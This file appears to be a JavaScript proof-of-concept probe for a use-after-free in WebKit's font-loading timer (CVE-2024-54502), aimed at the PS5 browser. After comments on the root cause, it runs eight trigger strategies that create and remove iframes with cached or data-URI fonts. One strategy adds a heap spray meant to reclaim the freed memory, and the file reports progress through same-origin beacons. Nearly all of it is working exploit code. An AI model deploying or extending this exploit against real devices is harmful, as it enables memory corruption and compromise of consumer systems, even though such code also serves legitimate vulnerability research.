// p184 — CVE-2024-54502 FontLoadingTimerFired UAF probe for PS5 14.20
// DocumentFontLoader::fontLoadingTimerFired() UAF
// WebKit Bug 281912 — Fix: commits.webkit.org/288711@main (Jan 10 2025)
// PS5 WebKit-1200 (Dec 2023 snapshot) = pre-fix = VULNERABLE
//
// Root cause: fontLoadingTimerFired() calls loadPendingFonts() which calls
// CachedResourceLoader::loadDone(). loadDone holds a RefPtr to Document.
// When that RefPtr is the last reference, Document is freed on return.
// fontLoadingTimerFired continues using freed DocumentFontLoader -> UAF.
//
// Fix was: Ref protectedThis { *this } at top of fontLoadingTimerFired.
//
// Trigger pattern (from regression test):
// - Two iframes load same font URL (second gets it from cache)
// - Both iframes remove themselves on load
// - Cached font load completes synchronously inside fontLoadingTimerFired
// - loadDone releases last Document ref -> Document freed -> UAF
//
// Beacon prefix: V184-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;
  var HELPER = 'p184-helper.html';

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V184-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  var hasFontFace = (typeof FontFace === 'function');
  syncB('FF-' + (hasFontFace ? 'Y' : 'N'));

  function pressGC(n) {
    var g = [];
    for (var i = 0; i < (n || 100000); i++) {
      g.push({ a: i, b: [i, i + 1], c: String(i) });
    }
    g = null;
  }

  function makeFrame() {
    var f = document.createElement('iframe');
    f.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
    return f;
  }

  // Data URI "font" — garbage that triggers font loading path then fails parse
  var FAKE_FONT = 'data:font/ttf;base64,AAEAAAALAIAAAwAwR1BPU0RFRgAAABwAAAAiT1' +
    'MvMgAAAEAAAABgY21hcAAAAKAAAAB0Z2x5ZgAAABQAAAAUaGVhZAAAASwAAAA2aGhlYQAAAWQ' +
    'AAAAkaG10eAAAAYgAAAAIbG9jYQAAAZAAAAAGbWF4cAAAAZgAAAAgbmFtZQAAAbgAAABJcG9z' +
    'dAAAAgQAAAATAAEAAAABAAA';

  // ================================================================
  // STRATEGY A: Regression test mirror
  // Two iframes, same HTTP font URL, remove on load.
  // Second iframe gets font from HTTP cache -> synchronous load in
  // fontLoadingTimerFired -> loadDone releases last Document ref.
  // ================================================================
  function stratA(cb) {
    syncB('A-START');

    var f1 = makeFrame();
    f1.src = HELPER + '?s=a1';

    f1.onload = function() {
      syncB('A-F1');

      var f2 = makeFrame();
      f2.src = HELPER + '?s=a2';

      f2.onload = function() {
        syncB('A-F2');
        f1.remove(); f2.remove();
        f1 = null; f2 = null;
        syncB('A-RM');
        pressGC();
        setTimeout(function() { syncB('A-OK'); if (cb) cb(); }, 300);
      };
      document.body.appendChild(f2);
    };
    document.body.appendChild(f1);
  }

  // ================================================================
  // STRATEGY B: Pre-load removal
  // Create iframe, remove BEFORE onload fires.
  // Document torn down while font loading is still setting up.
  // ================================================================
  function stratB(cb) {
    syncB('B-START');
    var ROUNDS = 25;
    var done = 0;

    function doOne() {
      if (done >= ROUNDS) {
        pressGC(200000);
        syncB('B-DONE');
        setTimeout(function() { syncB('B-OK'); if (cb) cb(); }, 300);
        return;
      }

      var f = makeFrame();
      f.src = HELPER + '?s=b' + done;
      document.body.appendChild(f);

      // Remove on next microtask — before onload
      setTimeout(function() {
        try { f.remove(); } catch(e) {}
        f = null;
        done++;
        if (done % 5 === 0) syncB('B-' + done);
        pressGC(20000);
        setTimeout(doOne, 5);
      }, 0);
    }

    doOne();
  }

  // ================================================================
  // STRATEGY C: Simultaneous iframes
  // Create N iframes at once, all same font URL. Remove all on last load.
  // Multiple Documents compete for the cached font.
  // ================================================================
  function stratC(cb) {
    syncB('C-START');
    var N = 8;
    var frames = [];
    var loaded = 0;

    function onAll() {
      syncB('C-ALL-' + loaded);
      for (var i = 0; i < frames.length; i++) frames[i].remove();
      frames = [];
      syncB('C-RM');
      pressGC(200000);
      setTimeout(function() { syncB('C-OK'); if (cb) cb(); }, 300);
    }

    for (var i = 0; i < N; i++) {
      var f = makeFrame();
      f.src = HELPER + '?s=c' + i;
      f.onload = (function() {
        return function() {
          loaded++;
          if (loaded >= N) onAll();
        };
      })();
      frames.push(f);
      document.body.appendChild(f);
    }
  }

  // ================================================================
  // STRATEGY D: Navigation destruction
  // Load iframe with font, navigate to about:blank.
  // Old Document destroyed, timer for old Document may still fire.
  // ================================================================
  function stratD(cb) {
    syncB('D-START');
    var ROUNDS = 12;
    var done = 0;

    function doOne() {
      if (done >= ROUNDS) {
        pressGC();
        syncB('D-DONE');
        setTimeout(function() { syncB('D-OK'); if (cb) cb(); }, 300);
        return;
      }

      var f = makeFrame();
      f.src = HELPER + '?s=d' + done;

      f.onload = function() {
        // Navigate away — old Document starts teardown
        f.src = 'about:blank';

        setTimeout(function() {
          f.remove();
          f = null;
          done++;
          if (done % 3 === 0) syncB('D-' + done);
          pressGC(30000);
          setTimeout(doOne, 10);
        }, 50);
      };

      document.body.appendChild(f);
    }

    doOne();
  }

  // ================================================================
  // STRATEGY E: FontFace API in iframe
  // Create FontFace via API, start load(), destroy iframe.
  // The API path also goes through DocumentFontLoader.
  // ================================================================
  function stratE(cb) {
    syncB('E-START');

    if (!hasFontFace) {
      syncB('E-SKIP');
      if (cb) cb();
      return;
    }

    var ROUNDS = 15;
    var done = 0;

    function doOne() {
      if (done >= ROUNDS) {
        pressGC();
        syncB('E-DONE');
        setTimeout(function() { syncB('E-OK'); if (cb) cb(); }, 300);
        return;
      }

      var f = makeFrame();
      f.srcdoc = '<!doctype html><html><body></body></html>';

      f.onload = function() {
        try {
          var iWin = f.contentWindow;
          var iDoc = f.contentDocument;

          if (typeof iWin.FontFace === 'function') {
            var ff = new iWin.FontFace(
              'E' + done,
              'url("' + BASE + '/beacon/V184-FONTREQ-E' + done + '")'
            );
            iDoc.fonts.add(ff);
            ff.load();
          }
        } catch(e) {
          syncB('E-ERR-' + (e.message || '').substring(0, 20));
        }

        f.remove();
        f = null;
        done++;
        if (done % 5 === 0) syncB('E-' + done);
        pressGC(30000);
        setTimeout(doOne, 15);
      };

      document.body.appendChild(f);
    }

    doOne();
  }

  // ================================================================
  // STRATEGY F: Data URI font + srcdoc (no network dependency)
  // Uses inline data: URI font so loading is synchronous.
  // The synchronous completion is what makes the UAF happen.
  // ================================================================
  function stratF(cb) {
    syncB('F-START');
    var ROUNDS = 20;
    var done = 0;

    var fontCSS = '@font-face { font-family: "DF"; ' +
      'src: url("' + FAKE_FONT + '") format("truetype"); } ' +
      'body { font-family: "DF", sans-serif; }';
    var helperHTML = '<!doctype html><html><head><style>' +
      fontCSS +
      '</style></head><body>' +
      '<div>ABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789</div>' +
      '</body></html>';

    function doOne() {
      if (done >= ROUNDS) {
        pressGC(200000);
        syncB('F-DONE');
        setTimeout(function() { syncB('F-OK'); if (cb) cb(); }, 300);
        return;
      }

      var f = makeFrame();
      f.srcdoc = helperHTML;

      f.onload = function() {
        f.remove();
        f = null;
        done++;
        if (done % 5 === 0) syncB('F-' + done);
        pressGC(30000);
        setTimeout(doOne, 5);
      };

      document.body.appendChild(f);
    }

    doOne();
  }

  // ================================================================
  // STRATEGY G: Heap spray exploitation variant
  // Regression test pattern + aggressive spray to reclaim Document memory.
  // If UAF fires, fontLoadingTimerFired operates on our controlled data.
  // ================================================================
  function stratG(cb) {
    syncB('G-START');
    var sprays = [];
    var SPRAY_SIZES = [2048, 4096, 8192, 16384];
    var PER_SIZE = 50;

    // Load three iframes sequentially — font gets cached after first
    var f1 = makeFrame();
    f1.src = HELPER + '?s=g1';

    f1.onload = function() {
      var f2 = makeFrame();
      f2.src = HELPER + '?s=g2';

      f2.onload = function() {
        var f3 = makeFrame();
        f3.src = HELPER + '?s=g3';

        f3.onload = function() {
          syncB('G-3OK');

          // Remove all at once
          f1.remove(); f2.remove(); f3.remove();
          f1 = null; f2 = null; f3 = null;

          syncB('G-RM');
          pressGC(300000);

          // Spray to reclaim Document-sized holes
          for (var si = 0; si < SPRAY_SIZES.length; si++) {
            var sz = SPRAY_SIZES[si];
            for (var j = 0; j < PER_SIZE; j++) {
              var ab = new ArrayBuffer(sz);
              var v = new Uint32Array(ab);
              v[0] = 0x41414141;
              v[1] = 0x42424242;
              for (var k = 2; k < v.length; k++) {
                v[k] = 0xDEAD0000 | (k & 0xFFFF);
              }
              sprays.push(ab);
            }
          }

          syncB('G-SPRAY-' + sprays.length);

          // Wait for timer to fire on reclaimed memory
          setTimeout(function() {
            var corrupted = 0;
            var firstHit = '';

            for (var i = 0; i < sprays.length; i++) {
              var v = new Uint32Array(sprays[i]);
              if (v[0] !== 0x41414141 || v[1] !== 0x42424242) {
                if (corrupted === 0) {
                  firstHit = 'i' + i + ':' + v[0].toString(16) + ',' + v[1].toString(16);
                }
                corrupted++;
              }
            }

            if (corrupted > 0) {
              syncB('G-HIT-' + corrupted + '-' + firstHit);
            } else {
              syncB('G-CLEAN');
            }

            syncB('G-OK');
            if (cb) cb();
          }, 500);
        };
        document.body.appendChild(f3);
      };
      document.body.appendChild(f2);
    };
    document.body.appendChild(f1);
  }

  // ================================================================
  // STRATEGY H: Dual data-URI with Blob URL iframes
  // Use Blob URL iframes with data: URI fonts.
  // First iframe loads, font data parsed. Second iframe gets "cached" data.
  // Both remove on load. Combines caching + synchronous load.
  // ================================================================
  function stratH(cb) {
    syncB('H-START');

    var fontCSS = '@font-face { font-family: "HF"; ' +
      'src: url("' + FAKE_FONT + '") format("truetype"); } ' +
      'body { font-family: "HF", sans-serif; }';
    var html = '<!doctype html><html><head><style>' + fontCSS +
      '</style></head><body>' +
      '<div>Testing font loading UAF trigger path</div>' +
      '</body></html>';

    var blob = new Blob([html], { type: 'text/html' });
    var blobURL = URL.createObjectURL(blob);

    var f1 = makeFrame();
    f1.src = blobURL;

    f1.onload = function() {
      syncB('H-F1');

      var f2 = makeFrame();
      f2.src = blobURL;

      f2.onload = function() {
        syncB('H-F2');
        f1.remove(); f2.remove();
        f1 = null; f2 = null;
        syncB('H-RM');
        pressGC(200000);

        setTimeout(function() {
          syncB('H-OK');
          URL.revokeObjectURL(blobURL);
          if (cb) cb();
        }, 300);
      };
      document.body.appendChild(f2);
    };
    document.body.appendChild(f1);
  }

  // Run all strategies sequentially
  syncB('RUN-ALL');

  stratA(function() {
    stratB(function() {
      stratC(function() {
        stratD(function() {
          stratE(function() {
            stratF(function() {
              stratG(function() {
                stratH(function() {
                  syncB('COMPLETE');
                });
              });
            });
          });
        });
      });
    });
  });

})();
